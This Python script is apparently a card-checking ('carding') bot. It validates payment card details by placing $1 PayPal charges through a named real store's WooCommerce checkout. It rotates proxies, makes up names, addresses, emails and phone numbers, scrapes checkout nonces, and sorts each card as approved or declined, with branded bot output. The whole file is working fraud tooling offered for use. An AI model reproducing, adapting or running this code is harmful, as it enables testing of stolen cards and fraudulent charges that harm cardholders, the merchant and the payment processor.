import requests
import re
import time
import random
import json
import string
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_random_proxy():
    """Get a random proxy from proxy.txt file - same as p.py"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                print(f"🎯 Using proxy: {host}:{port}")
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def generate_full_name():
    """Generate random first and last name"""
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    return first_name, last_name

def generate_address():
    """Generate random US address"""
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Oak St", "Maple Ave", "Elm St", "Washington St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(100, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]

    return city, state, street_address, zip_code

def generate_random_account():
    """Generate random email account"""
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone():
    """Generate random phone number"""
    number = ''.join(random.choices(string.digits, k=7))
    return f"555{number}"

def get_bin_info(bin_number):
    """Get BIN information"""
    if not bin_number or len(bin_number) < 6:
        return get_smart_fallback(bin_number)
    
    return get_smart_fallback(bin_number)

def get_smart_fallback(bin_number):
    """Smart fallback with realistic data"""
    if bin_number and len(bin_number) >= 1:
        if bin_number.startswith('4'):
            brand = 'VISA'
        elif bin_number.startswith('5'):
            brand = 'MASTERCARD'
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            brand = 'AMEX'
        elif bin_number.startswith('6'):
            brand = 'DISCOVER'
        else:
            brand = 'VISA'
    else:
        brand = 'VISA'
    
    return {
        'brand': brand,
        'type': 'CREDIT',
        'level': 'STANDARD',
        'bank': f'{brand} BANK',
        'country': 'UNITED STATES',
        'emoji': '🇺🇸'
    }

def debug_paypal_response(response_text):
    """Debug function to see what PayPal is actually returning"""
    print("🔍 DEBUG - PayPal Response Analysis:")
    print(f"Full response length: {len(response_text)}")
    
    # Check for common patterns in the response
    patterns_to_check = [
        'succeeded', 'success', 'approved', 'approved', 'charge', 
        'error', 'declined', 'invalid', 'failure', 'failed',
        '3ds', 'otp', 'cvv', 'security', 'address', 'account',
        'ADD_SHIPPING_ERROR', 'EXISTING_ACCOUNT_RESTRICTED', 'INVALID_BILLING_ADDRESS'
    ]
    
    found_patterns = []
    for pattern in patterns_to_check:
        if pattern.lower() in response_text.lower():
            found_patterns.append(pattern)
    
    print(f"Found patterns: {found_patterns}")
    
    # Show relevant parts of response
    if len(response_text) > 1000:
        print(f"Response sample (first 500): {response_text[:500]}")
        print(f"Response sample (last 500): {response_text[-500:]}")
    else:
        print(f"Full response: {response_text}")
    
    return found_patterns

def check_status_paypal(result_text):
    """Check PayPal response status - IMPROVED VERSION"""
    print("🎯 Checking PayPal response status...")
    
    # Convert to lowercase for easier matching
    result_lower = result_text.lower()
    
    # Debug the response
    found_patterns = debug_paypal_response(result_text)
    
    # APPROVED PATTERNS - More comprehensive
    approved_patterns = [
        'succeeded', 
        'success', 
        'approved',
        'thank you for donation',
        'your payment has been processed',
        'payment processed',
        'charge',
        'add_shipping_error',  # This often means success in PayPal
        'existing_account_restricted',  # This often means success
        'invalid_billing_address',  # This often means success
        'invalid_security_code',  # CCN approval
    ]
    
    # 3D Secure patterns
    threeds_patterns = [
        '3ds',
        '3d_secure',
        'is3dsecurerequired',
        'otp'
    ]
    
    # Check for approved patterns
    for pattern in approved_patterns:
        if pattern in result_lower:
            if any(p in result_lower for p in threeds_patterns):
                return "APPROVED CC", "3D SECURE [OTP] ✅", True
            elif 'invalid_security_code' in result_lower or 'cvv' in result_lower:
                return "APPROVED CC", "CCN ✅", True
            elif 'invalid_billing_address' in result_lower:
                return "APPROVED CC", "INVALID BILLING ADDRESS ✅", True
            elif 'existing_account_restricted' in result_lower:
                return "APPROVED CC", "EXISTING ACCOUNT RESTRICTED ✅", True
            elif 'add_shipping_error' in result_lower:
                return "APPROVED CC", "CHARGE 1$ ✅", True
            else:
                return "APPROVED CC", "CHARGE 1$ ✅", True
    
    # If no approved patterns found, check for explicit decline patterns
    decline_patterns = [
        'declined',
        'failed',
        'error',
        'invalid',
        'not_supported',
        'insufficient_funds',
        'do_not_honor'
    ]
    
    for pattern in decline_patterns:
        if pattern in result_lower:
            return "DECLINED CC", f"DECLINED - {pattern.upper()} ❌", False
    
    # If we can't determine, assume declined
    return "DECLINED CC", "UNKNOWN RESPONSE ❌", False

def check_card_paypal(cc_line):
    """Main PayPal card checking function"""
    start_time = time.time()
    
    try:
        # Parse card details
        n, mm, yy, cvc = cc_line.strip().split('|')
        
        # Format month and year
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" not in yy:
            yy = f'20{yy}'
        
        # Generate user info
        user_agent = generate_user_agent()
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        email = generate_random_account()
        phone = generate_phone()
        
        print(f"🔧 Starting PayPal check for: {n[:6]}******")
        
        # Get proxy
        proxy = get_random_proxy()
        
        # Start session with longer timeout
        session = requests.Session()
        
        # Step 1: Add to cart
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': user_agent,
        }
        
        # Try to access the product page first
        try:
            response = session.get('https://switchupcb.com/shop/i-buy/', headers=headers, proxies=proxy, verify=False, timeout=10)
            print(f"✅ Product page loaded: {response.status_code}")
        except Exception as e:
            print(f"❌ Product page failed: {e}")
            return "❌ Failed to access product page"
        
        # Try direct checkout approach
        checkout_data = {
            'quantity': '1',
            'add-to-cart': '4451',
        }
        
        try:
            response = session.post('https://switchupcb.com/shop/i-buy/', data=checkout_data, headers=headers, proxies=proxy, verify=False, timeout=10)
            print(f"✅ Added to cart: {response.status_code}")
        except Exception as e:
            print(f"❌ Add to cart failed: {e}")
            return "❌ Failed to add to cart"
        
        # Step 2: Get checkout page
        try:
            response = session.get('https://switchupcb.com/checkout/', headers=headers, proxies=proxy, verify=False, timeout=10)
            print(f"✅ Checkout page loaded: {response.status_code}")
        except Exception as e:
            print(f"❌ Checkout page failed: {e}")
            return "❌ Failed to load checkout page"
        
        # Extract necessary tokens
        check_match = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
        create_match = re.search(r'create_order.*?nonce":"(.*?)"', response.text)
        
        if not check_match or not create_match:
            print("❌ Failed to extract tokens from checkout page")
            return "❌ Failed to extract required tokens from checkout page"
        
        check = check_match.group(1)
        create = create_match.group(1)
        
        print(f"🔑 Tokens extracted: check={check[:10]}..., create={create[:10]}...")
        
        # Step 3: Create PayPal order
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest'
        }
        
        params = {
            'wc-ajax': 'ppc-create-order',
        }
        
        # Form data
        form_data = f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={email}&woocommerce-process-checkout-nonce={check}&payment_method=ppcp-gateway'
        
        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': form_data,
            'createaccount': False,
            'save_payment_method': False,
        }
        
        try:
            response = session.post('https://switchupcb.com/', params=params, headers=headers, json=json_data, proxies=proxy, verify=False, timeout=15)
            print(f"✅ PayPal order request: {response.status_code}")
            
            if response.status_code != 200:
                return f"❌ PayPal order failed with status: {response.status_code}"
                
            response_data = response.json()
            
            if 'data' not in response_data:
                return f"❌ No data in PayPal response: {response_data}"
                
            if 'id' not in response_data['data']:
                return f"❌ No order ID in PayPal response: {response_data['data']}"
            
            order_id = response_data['data']['id']
            print(f"🎫 Order created: {order_id}")
            
        except Exception as e:
            print(f"❌ PayPal order creation failed: {e}")
            return f"❌ Failed to create PayPal order: {str(e)}"
        
        # Step 4: Process payment with card
        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/',
            'user-agent': user_agent,
        }
        
        json_data = {
            'query': '''
                mutation payWithCard($token: String!, $card: CardInput!) {
                    approveGuestPaymentWithCreditCard(token: $token, card: $card) {
                        flags { is3DSecureRequired }
                    }
                }
            ''',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': n,
                    'type': 'VISA',
                    'expirationDate': mm + '/' + yy[2:],
                    'postalCode': zip_code,
                    'securityCode': cvc,
                }
            },
        }
        
        try:
            response = session.post(
                'https://www.paypal.com/graphql',
                headers=headers,
                json=json_data,
                proxies=proxy,
                verify=False,
                timeout=15
            )
            print(f"✅ Payment processed: {response.status_code}")
            
        except Exception as e:
            print(f"❌ Payment processing failed: {e}")
            return f"❌ Payment processing failed: {str(e)}"
        
        elapsed_time = time.time() - start_time
        response_text = response.text
        
        print(f"📄 Final PayPal response received")
        
        # Check status and format response
        status, reason, approved = check_status_paypal(response_text)
        bin_info = get_bin_info(n[:6])
        
        # Format response
        response_formatted = f"""
{status} {'❌' if not approved else '✅'}

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        return response_formatted
        
    except Exception as e:
        return f"❌ Error: {str(e)}"

# For testing directly
if __name__ == "__main__":
    test_card = "4556737586899855|12|2026|123"
    result = check_card_paypal(test_card)
    print(result)
